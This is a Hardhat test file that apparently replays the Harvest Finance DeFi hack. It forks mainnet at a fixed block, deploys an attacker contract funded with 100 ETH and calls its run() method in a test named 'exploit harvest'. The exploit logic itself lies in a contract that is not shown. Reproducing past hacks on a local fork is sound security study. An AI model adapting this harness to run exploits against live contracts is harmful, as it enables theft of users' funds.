import { Contract, ContractTransaction, Signer } from "ethers";
import { ethers } from "hardhat";
import { forkFrom } from "../utils/fork";
import { getAttackerContractName } from "../utils/fs";


let attackerEOA: Signer;
let attacker: Contract
let tx: ContractTransaction;

before(async () => {
  await forkFrom(11129412);
  [attackerEOA] = await ethers.getSigners();
  const attackerFactory = await ethers.getContractFactory(
    getAttackerContractName(__filename),
    attackerEOA
  )
  attacker = await attackerFactory.deploy({value: ethers.utils.parseEther(`100`)})
  await attacker.deployed()

  // await attackerEOA.sendTransaction({
  //   to: attacker.address,
  //   value: ethers.utils.parseEther(`100`)
  // })
});

describe("Harvest Hack", function () {
  it("exploit harvest", async function () {
    await attacker.run({gasLimit: 22000000, gasPrice: 99})
  }); 
});
